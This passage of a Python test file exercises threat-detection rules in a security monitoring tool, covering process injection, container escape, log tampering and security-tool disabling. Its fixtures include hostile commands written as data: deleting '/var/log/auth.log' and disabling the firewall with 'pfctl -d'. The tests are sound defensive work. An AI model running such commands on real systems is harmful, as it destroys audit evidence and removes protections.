            _security_event("KERNEL_THREAT", "PROCESS_INJECTION"),
        ]
        incidents = evaluate_advanced_rules(events, _DEVICE)

        # At least process_injection should fire
        rule_names = [i.rule_name for i in incidents]
        assert "process_injection" in rule_names

    def test_evaluate_returns_empty_on_benign(self):
        events = [
            _process_event("ls -la /tmp", offset_sec=0),
        ]
        incidents = evaluate_advanced_rules(events, _DEVICE)
        assert incidents == []

    def test_evaluate_empty_events(self):
        incidents = evaluate_advanced_rules([], _DEVICE)
        assert incidents == []

    def test_evaluate_handles_rule_exceptions(self):
        """If one rule raises, other rules still execute."""
        events = [
            _security_event("KERNEL_THREAT", "CONTAINER_ESCAPE"),
        ]

        # Patch one rule to throw
        with patch(
            "amoskys.intel.advanced_rules.rule_apt_initial_access_chain",
            side_effect=RuntimeError("boom"),
        ):
            incidents = evaluate_advanced_rules(events, _DEVICE)

        # container_escape should still fire
        rule_names = [i.rule_name for i in incidents]
        assert "container_escape" in rule_names

    def test_evaluate_multiple_rules_fire(self):
        """Multiple rules can fire on the same event set."""
        events = [
            # Log tampering
            _process_event("rm -rf /var/log/auth.log", offset_sec=0),
            # Security tool disable
            _process_event("pfctl -d", offset_sec=5),
            # Process injection
            _security_event("KERNEL_THREAT", "PROCESS_INJECTION", offset_sec=10),
        ]
        incidents = evaluate_advanced_rules(events, _DEVICE)

        rule_names = [i.rule_name for i in incidents]
        assert "log_tampering" in rule_names
        assert "security_tool_disable" in rule_names
        assert "process_injection" in rule_names


# ============================================================================
# Incident structure validation
# ============================================================================


class TestIncidentStructure:
    """Validate the shape of generated Incident objects from rules."""

    def test_incident_has_required_fields(self):
        events = [
            _security_event("KERNEL_THREAT", "PROCESS_INJECTION"),
        ]
        inc = rule_process_injection(events, _DEVICE)

        assert inc is not None
        assert inc.incident_id.startswith("proc_inject_")
        assert inc.device_id == _DEVICE
        assert isinstance(inc.severity, Severity)
        assert len(inc.tactics) > 0
        assert len(inc.techniques) > 0
        assert len(inc.rule_name) > 0
        assert len(inc.summary) > 0
        assert len(inc.event_ids) > 0

    def test_incident_to_dict(self):
        events = [
            _security_event("KERNEL_THREAT", "CONTAINER_ESCAPE"),
        ]
        inc = rule_container_escape(events, _DEVICE)
        d = inc.to_dict()

        assert d["device_id"] == _DEVICE
        assert d["severity"] == "CRITICAL"
        assert isinstance(d["tactics"], list)
        assert isinstance(d["techniques"], list)
        assert isinstance(d["event_ids"], list)
